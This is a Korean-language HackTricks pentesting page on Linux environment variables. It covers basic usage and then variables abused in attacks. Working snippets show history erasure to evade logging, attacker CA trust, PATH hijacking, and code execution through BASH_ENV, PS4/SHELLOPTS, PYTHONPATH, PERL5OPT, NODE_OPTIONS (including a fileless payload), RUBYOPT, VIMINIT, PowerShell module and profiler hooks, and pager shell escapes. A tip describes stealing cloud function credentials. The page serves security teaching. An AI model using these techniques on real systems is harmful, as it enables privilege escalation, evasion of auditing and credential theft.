# Linux 환경 변수

{{#include ../../banners/hacktricks-training.md}}

## 전역 변수

전역 변수는 **자식 프로세스**에 상속됩니다.

현재 세션에서 다음과 같이 전역 변수를 만들 수 있습니다:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

이 변수는 현재 세션과 해당 세션의 자식 프로세스에서 사용할 수 있습니다.

다음과 같이 변수를 **제거**할 수 있습니다:

```bash
unset MYGLOBAL
```

## 로컬 변수

**로컬 변수**는 **현재 셸/스크립트**에서만 **접근할 수 있습니다**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## 현재 변수 목록

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

`/proc/*/environ`의 내용은 **NUL 문자로 구분**되므로, 다음과 같은 변형이 보통 더 읽기 쉽습니다:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

환경 변수를 상속받은 환경에서 **credentials** 또는 **흥미로운 서비스 구성**을 찾고 있다면 [Linux Post Exploitation](../post-exploitation/README.md)도 확인하세요.

## 일반 변수

출처: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X**에서 사용하는 디스플레이입니다. 이 변수는 보통 **:0.0**으로 설정되며, 현재 컴퓨터의 첫 번째 디스플레이를 의미합니다.
- **EDITOR** – 사용자가 선호하는 텍스트 편집기입니다.
- **HISTFILESIZE** – 히스토리 파일에 저장되는 최대 줄 수입니다.
- **HISTSIZE** – 사용자가 세션을 마칠 때 히스토리 파일에 추가되는 줄 수입니다.
- **HOME** – 홈 디렉터리입니다.
- **HOSTNAME** – 컴퓨터의 호스트 이름입니다.
- **LANG** – 현재 언어입니다.
- **MAIL** – 사용자의 메일 스풀 위치입니다. 보통 **/var/spool/mail/USER**입니다.
- **MANPATH** – 매뉴얼 페이지를 검색할 디렉터리 목록입니다.
- **OSTYPE** – 운영 체제 유형입니다.
- **PS1** – bash의 기본 프롬프트입니다.
- **PATH** – 상대 경로 또는 절대 경로를 지정하지 않고 파일 이름만으로 실행할 수 있는 바이너리 파일이 들어 있는 모든 디렉터리의 경로를 저장합니다.
- **PWD** – 현재 작업 디렉터리입니다.
- **SHELL** – 현재 명령 셸의 경로입니다(예: **/bin/bash**).
- **TERM** – 현재 터미널 유형입니다(예: **xterm**).
- **TZ** – 시간대입니다.
- **USER** – 현재 사용자 이름입니다.

## 해킹에 유용한 변수

모든 변수가 똑같이 유용한 것은 아닙니다. 공격 관점에서는 **검색 경로**, **시작 파일**, **동적 링커 동작**, **감사/로깅**을 변경하는 변수에 우선순위를 두세요.

### **HISTFILESIZE**

**이 변수의 값을 0으로 변경**하면 **세션을 종료할 때** **히스토리 파일**(\~/.bash_history)이 **0줄로 잘립니다**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

이 변수의 **값을 0으로 변경**하면 명령이 **메모리 내 기록에 저장되지 않으며**, **기록 파일**(\~/.bash_history)에도 기록되지 않습니다.

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

이 변수의 **값이 `ignorespace` 또는 `ignoreboth`로 설정되어 있으면**, 앞에 공백을 추가한 명령은 history에 저장되지 않습니다.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

**history file**을 **`/dev/null`**로 지정하거나 완전히 unset하세요. 일반적으로 history size만 변경하는 것보다 더 확실합니다.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

프로세스는 **http 또는 https**를 통해 인터넷에 연결할 때 여기에 지정된 **proxy**를 사용합니다.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: 이를 따르는 도구/프로토콜의 기본 proxy.
- `no_proxy`: 직접 연결해야 하는 대상의 우회 목록(호스트/도메인/CIDR).

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

소문자 및 대문자 변형을 도구에 따라 사용할 수 있습니다(`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

프로세스는 **이러한 환경 변수**에 지정된 인증서를 신뢰합니다. 이를 이용하면 **`curl`**, **`git`**, Python HTTP 클라이언트 또는 패키지 관리자 같은 도구가 공격자가 제어하는 CA를 신뢰하도록 할 수 있습니다(예: interception proxy가 정상적인 것처럼 보이게 할 수 있습니다).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

권한이 있는 wrapper/script가 **절대 경로 없이** 명령을 실행하면, `PATH`에서 **공격자가 제어하는 첫 번째 디렉터리**의 명령이 우선 실행됩니다. 이것이 `sudo`, cron 작업, 셸 wrapper, 사용자 지정 SUID 헬퍼에서 발생하는 여러 **PATH hijack**의 기반 원리입니다. `env_keep+=PATH`, 취약한 `secure_path`, 또는 `tar`, `service`, `cp`, `python` 등을 이름만으로 호출하는 wrapper를 찾아보세요.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

`PATH`를 악용하는 전체 privilege-escalation 체인은 [Linux Privilege Escalation](linux-privilege-escalation/README.md)을 확인하세요.

### **HOME & XDG_CONFIG_HOME**

`HOME`은 단순한 디렉터리 참조가 아닙니다. 많은 도구가 `$HOME` 또는 `$XDG_CONFIG_HOME`에서 **dotfiles**, **plugins**, **사용자별 configuration**을 자동으로 불러옵니다. 권한이 높은 workflow에서 이러한 값이 유지된다면, 바이너리 하이재킹보다 **config injection**이 더 쉬울 수 있습니다.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Interesting한 대상에는 `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` 및 `.terraformrc` 같은 도구별 파일이 포함됩니다.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

이 변수들은 **동적 링커**에 영향을 줍니다.

- `LD_PRELOAD`: 추가 공유 객체를 먼저 로드하도록 강제합니다.
- `LD_LIBRARY_PATH`: 라이브러리 검색 디렉터리를 앞에 추가합니다.
- `LD_AUDIT`: 라이브러리 로드 및 심볼 해석을 관찰하는 감사 라이브러리를 로드합니다.

권한이 있는 명령이 이 변수들을 유지하면 **hooking**, **instrumentation**, **권한 상승**에 매우 유용합니다. **보안 실행** 모드(`AT_SECURE`, 예: setuid/setgid/capabilities)에서는 로더가 이러한 변수 대부분을 제거하거나 제한합니다. 하지만 로더 초기 단계의 파서 버그는 대상 프로그램보다 **먼저** 실행되므로 여전히 큰 영향을 미칠 수 있습니다.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`는 glibc의 초기 동작(예: allocator tunables)을 변경하며 exploit lab에서 매우 유용합니다. 또한 **dynamic loader가 이를 매우 초기에 파싱**하므로 보안 측면에서도 중요합니다. 2023년 **Looney Tunables** 버그는 loader에서 파싱되는 단일 환경 변수가 SUID 프로그램에 대한 **로컬 권한 상승 수단**이 될 수 있음을 다시 한번 보여주었습니다.<sup>[[6]](#references)</sup>

CVE-2023-4911의 경우, **설치된 배포판 패키지 릴리스**를 해당 공급업체의 수정된 릴리스와 비교하고 새 프로세스에서 실제로 사용되는 loader를 확인하세요. 업스트림 버전 문자열만으로는 신뢰할 수 없습니다. Debian은 영향을 받는 파서를 2.31 패키지에 백포트했고, 다른 배포판은 업스트림 버전 번호를 바꾸지 않고 수정 사항을 백포트했습니다. 실제 권한 전환을 위해서는 `NoNewPrivs`, `nosuid` 마운트 또는 다른 완화책에 의해 ID 변경이 차단되지 않는, 권한이 부여된 실행 파일 대상도 필요합니다. 수동 열거 중에는 잘못된 `GLIBC_TUNABLES`로 충돌을 유발하는 탐침을 실행하지 마세요. 릴리스별 적용 여부는 [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911), [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911)를 참조하세요. Ubuntu의 [security notice](https://ubuntu.com/security/notices/USN-6409-1)는 업데이트 후 재부팅도 권고합니다.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

**Bash**가 **비대화형**으로 시작되면, 대상 스크립트를 실행하기 전에 `BASH_ENV`를 확인하고 해당 파일을 source합니다. Bash가 `sh`로 호출되거나 POSIX 스타일 대화형 모드로 실행되면 `ENV`도 확인할 수 있습니다. 이는 환경 변수를 공격자가 제어할 수 있을 때 셸 래퍼를 코드 실행으로 이어지게 하는 고전적인 방법입니다.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash는 **실제 ID와 유효 ID가 다를 때** 이러한 시작 파일을 무시합니다. `-p`는 유효 ID를 유지하지만 해당 시작 파일을 활성화하지는 않으므로, 정확한 동작은 래퍼가 셸을 실행하는 방식에 따라 달라집니다. `setuid()`/`setgid()`를 Bash 실행 **전에** 호출하는 권한 있는 래퍼에 주의하세요. ID가 다시 일치하면 Bash가 원래 무시했을 `BASH_ENV`, `ENV` 및 관련 셸 상태를 신뢰할 수 있습니다.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash에서 **xtrace**가 활성화되면 `PS4`를 확장하고 추적 중인 각 명령 앞에 출력합니다. `PS4`는 프롬프트처럼 확장되므로, 그 안의 **command substitution**이 실행됩니다. 중요한 점은 `SHELLOPTS=xtrace`를 export하는 것만으로 환경에서 xtrace를 활성화할 수 있다는 것입니다. 명령줄에 `-x`를 지정할 필요가 없으므로, 피해자가 실행하는 Bash 스크립트가 무엇이든 코드 실행으로 이어집니다.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4`는 xtrace가 활성화될 때까지 아무 동작도 하지 않습니다(`SHELLOPTS=xtrace`, `set -x` 또는 `bash -x`). Bash는 `BASH_ENV`와 마찬가지로 privileged/setuid 컨텍스트에서 `SHELLOPTS`를 제거합니다.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

이 변수들은 Python의 시작 방식을 변경합니다.

- `PYTHONPATH`: import 검색 경로 앞에 경로를 추가합니다.
- `PYTHONHOME`: 표준 라이브러리 트리의 위치를 변경합니다.
- `PYTHONSTARTUP`: 대화형 프롬프트가 시작되기 전에 파일을 실행합니다.
- `PYTHONINSPECT=1`: 스크립트가 끝난 뒤 대화형 모드로 진입합니다.
- `PYTHONBREAKPOINT`: 코드가 `breakpoint()`에 도달할 때 호출되는 `package.module.callable`입니다(해당 모듈도 import됩니다).<sup>[[8]](#references)</sup>

이 변수들은 제어 가능한 환경으로 Python을 호출하는 maintenance scripts, debuggers, shells, wrappers를 대상으로 할 때 유용합니다. `python -E`와 `python -I`는 모든 `PYTHON*` 변수를 무시합니다.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

최근 실제 사례로는 2024년 Ubuntu/Debian 시스템의 **needrestart** LPE가 있습니다. root 소유 scanner가 권한이 없는 프로세스의 `PYTHONPATH`를 `/proc/<PID>/environ`에서 복사한 뒤 Python을 실행했습니다. 공개된 exploit은 공격자가 제어하는 경로에 `importlib/__init__.so`를 심어, helper에 하드 코딩된 스크립트가 실행되기도 전에 Python이 자체 초기화 과정에서 공격자 코드를 실행하게 했습니다.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl에도 똑같이 유용한 시작 변수가 있습니다.

- `PERL5LIB`: 라이브러리 디렉터리를 앞에 추가합니다.
- `PERL5OPT`: 모든 `perl` 명령줄에 지정된 것처럼 옵션을 삽입합니다.

이렇게 하면 대상 스크립트가 중요한 작업을 수행하기 전에 **모듈을 자동으로 로드**하거나 interpreter 동작을 바꿀 수 있습니다. Perl은 **taint / setuid / setgid** 컨텍스트에서 이러한 변수를 무시하지만, 일반적인 root 실행 wrapper, CI 작업, installer, 사용자 지정 sudoers 규칙에서는 여전히 매우 중요합니다.

sudo 규칙이 환경 변수 재정의를 허용하고 권한이 있는 명령이 결국 Perl을 실행한다면 `PERL5DB`도 확인하세요. Perl 문서에 따르면 `PERL5OPT=-d`는 debugger를 시작하고, `PERL5DB`는 Perl이 `-d` 옵션만으로 시작할 때 debugger 초기화 코드를 제공합니다. `PERL5LIB`와 `PERLLIB`만 해제해도 이 경로는 차단되지 않습니다. 이 변수들은 sudo와 wrapper를 거쳐 유지되어야 하며, Perl 프로세스가 taint 또는 set-ID 처리로 이를 무시하지 않아야 합니다. 열거 과정에서 권한이 있는 helper를 실행하지 말고, 정확한 규칙과 실행 체인을 확인하세요. [perlrun의 환경 변수 참조 문서](https://perldoc.perl.org/perlrun#ENVIRONMENT)를 참고하세요.

Perl에 내장된 [`@INC` 검색 경로](https://perldoc.perl.org/perlvar#@INC)도 환경 변수가 유지되지 않더라도 모듈 신뢰 경계가 될 수 있습니다. 권한이 있는 Perl 프로세스의 경우, 실제 `use` 또는 `require` 문을 확인하고, 확인된 모듈 이름 및 검색 순서와 권한이 낮은 사용자가 검색 대상 디렉터리에 해당 모듈을 만들거나 교체할 수 있는지를 연관 지어 살펴보세요. 라이브러리 디렉터리에 쓰기 권한이 있다는 사실만으로 권한이 있는 프로세스가 그곳의 코드를 로드한다고 단정할 수는 없습니다.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS`는 환경을 상속하는 모든 `node` 프로세스에 **Node.js CLI flags**를 앞에 추가합니다. 따라서 궁극적으로 Node를 실행하는 래퍼, CI 작업, Electron 헬퍼, sudo 규칙에 유용합니다. 공격 관점에서 가장 흥미로운 flags는 보통 다음과 같습니다.

- `--require <file>`: 대상 스크립트보다 먼저 CommonJS 파일을 preload합니다.
- `--import <module>`: 대상 스크립트보다 먼저 ES module을 preload합니다.

Node는 `NODE_OPTIONS`에서 일부 위험한 flags를 거부하지만, `--require`와 `--import`는 명시적으로 허용되며 일반 명령줄 인수보다 **먼저** 처리됩니다.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### `data:` URL을 사용한 파일리스 preload

대상에서 `NODE_OPTIONS`를 설정할 수 있지만 **파일을 쓸 수 없는 경우**(읽기 전용 파일 시스템, 제한된 API, serverless 런타임 등), `--import`는 `data:text/javascript,` URL을 허용하므로 전체 payload를 환경 변수 안에 넣을 수 있습니다. JavaScript는 **완전히 URL 인코딩되어야 합니다**. Node는 값을 URL로 파싱하므로, 인코딩되지 않은 공백(또는 다른 문자)이 있으면 payload가 잘리고 `SyntaxError`가 발생합니다. 이 방법은 `--import`가 `NODE_OPTIONS` 허용 목록에 포함된 Node 20.6 이상에서 작동합니다.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> 이는 함수가 Node를 실행하는 **managed cloud runtimes**에서 `NODE_OPTIONS` 제어를 RCE로 전환하는 흔한 방법입니다. 예를 들어 Lambda의 구성만 변경할 수 있는 공격자(`lambda:UpdateFunctionConfiguration` 권한은 있지만 `iam:PassRole` 권한이나 코드 업데이트 권한은 없음)는 `NODE_OPTIONS=--import data:text/javascript,<payload>`를 주입해 함수 내에서 코드를 실행하고 실행 역할의 자격 증명을 탈취할 수 있습니다. 주입된 모듈은 핸들러보다 **먼저** 실행되며, 이후 핸들러는 정상적으로 실행됩니다.

`NODE_OPTIONS`를 간접적으로 설정하는 원격 gadget chain(예: prototype pollution을 이용한 RCE)은 [이 페이지](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)를 확인하세요.

### **RUBYLIB & RUBYOPT**

Ruby에서도 같은 유형의 시작 시점 악용이 가능합니다.

- `RUBYLIB`: Ruby의 load path 앞에 디렉터리를 추가합니다.
- `RUBYOPT`: 모든 `ruby` 호출에 `-r` 같은 명령줄 옵션을 주입합니다.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

2024년 **needrestart** 취약점은 이것이 단순한 실습용 기법이 아님을 보여주었습니다. `PYTHONPATH` 악용에 취약했던 동일한 root 권한 helper를 공격자가 제어하는 `RUBYLIB`로 Ruby를 실행하도록 유도해, 공격자 디렉터리에서 `enc/encdb.so`를 로드하게 할 수도 있었습니다.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim은 일반적인 시작 과정에서 `VIMINIT`(또는 대체 변수인 `EXINIT`)에 포함된 Ex 명령을 실행합니다. Ex 명령에는 `:!cmd`와 `:call system(...)`이 포함되므로, 이 변수를 제어하면 피해자가 Vim을 열 때마다 코드 실행이 가능합니다(예: root 권한의 `sudo vim`, `crontab -e`, `visudo`, `$EDITOR`를 실행하는 `git`/`less` 등).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode(`vim -es`/`-Es`)에서는 이러한 변수를 건너뛰지만, 일반적인 대화형 시작 시에는 변수가 실행됩니다.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core(`pwsh`)는 Linux/macOS(및 Windows)에서 실행되며 **.NET 애플리케이션**이므로, 여러 환경 변수를 이용하면 상속된 환경에서 실행되는 모든 `pwsh` 호출을 코드 실행으로 이어지게 할 수 있습니다. 이는 cron/systemd 작업, CI runner 및 `pwsh`를 호출하는 권한 있는 wrapper를 공격하는 데 유용합니다.

- `PSModulePath`: PowerShell은 이 목록의 모든 디렉터리를 재귀적으로 검색해 `.psd1`/`.psm1` 모듈을 찾고, 모듈이 내보내는 명령을 처음 참조할 때 **자동으로 로드**합니다. 디렉터리를 앞에 추가하면 모듈의 최상위 코드가 import 시 실행됩니다. 명령 해석 순서가 *Alias → Function → Cmdlet*이므로, 내보낸 함수가 피해자가 호출하는 기본 제공 cmdlet을 가로챌 수도 있습니다.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: 시작 시 실행되는 `powershell/Microsoft.PowerShell_profile.ps1`의 위치를 변경합니다(`-NoProfile`을 지정하지 않은 경우).
- `DOTNET_STARTUP_HOOKS`: `Main`보다 먼저 `StartupHook.Initialize()`가 실행되는 managed assembly입니다(모든 .NET 앱에서 공유).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API가 시작 시 공격자의 라이브러리를 프로세스에 로드합니다(경로 변수가 레지스트리보다 우선하며, `DOTNET_*`은 최신 alias입니다). Windows PowerShell 5.1(.NET Framework)에서는 `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`를 사용합니다. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Windows에서는 `PSExecutionPolicyPreference=Bypass`가 "서명되지 않은 스크립트 차단" 보호 장치도 제거하므로, 심어 둔 profile/module이 실제로 실행됩니다. 전체 PoC는 전용 페이지를 참조하세요.

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

일부 도구는 환경 변수에서 경로를 읽는 데 그치지 않고 값을 **shell**, **editor** 또는 **입력 전처리기**에 전달합니다. 따라서 권한이 높은 wrapper가 `git`, `man`, `less` 또는 이와 유사한 텍스트 뷰어를 실행할 때 다음 변수들이 특히 주목할 만합니다.

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager 명령을 지정합니다.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: editor 명령을 지정하며, 인수가 포함되는 경우가 많습니다.
- `LESSOPEN`, `LESSCLOSE`: `less`가 파일을 열 때 실행되는 전처리기/후처리기를 정의합니다.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git은 `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`를 통해 디스크를 건드리지 않고 환경 변수만으로 설정을 주입하는 기능도 지원합니다:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

post-exploitation 관점에서, 상속된 환경 변수에는 **credentials**, **proxy settings**, **service tokens** 또는 **cloud keys**가 포함되는 경우가 많다는 점도 기억하세요. `/proc/<PID>/environ` 및 `systemd` `Environment=` 검색 방법은 [Linux Post Exploitation](../post-exploitation/README.md)을 확인하세요.

### PS1

프롬프트 모양을 변경합니다.

[**예시입니다**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: 예시입니다](<../images/image (897).png>)

일반 사용자:

![PERL5OPT & PERL5LIB - PS1: 백그라운드 작업 하나, 둘, 세 개](<../images/image (740).png>)

백그라운드 작업 하나, 둘, 세 개:

![PERL5OPT & PERL5LIB - PS1: 백그라운드 작업 하나, 둘, 세 개](<../images/image (145).png>)

백그라운드 작업 하나, 중지된 작업 하나, 마지막 명령이 올바르게 완료되지 않음:

![PERL5OPT & PERL5LIB - PS1: 백그라운드 작업 하나, 중지된 작업 하나, 마지막 명령이 올바르게 완료되지 않음](<../images/image (715).png>)

## References

- [1] [GNU Bash 매뉴얼 - Bash 시작 파일](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart의 LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI 문서 - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [일반적인 환경 변수 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc의 ld.so에서 발생하는 로컬 권한 상승 - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash 매뉴얼 - Bash 변수(`PS4`) 및 Set 내장 명령(`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - 내장 breakpoint() 및 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim 문서 - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath 및 PowerShell 모듈 자동 로드](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET 디버깅 및 프로파일링 구성 설정(`CORECLR_`/`DOTNET_`/`COR_` 프로파일러 변수)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
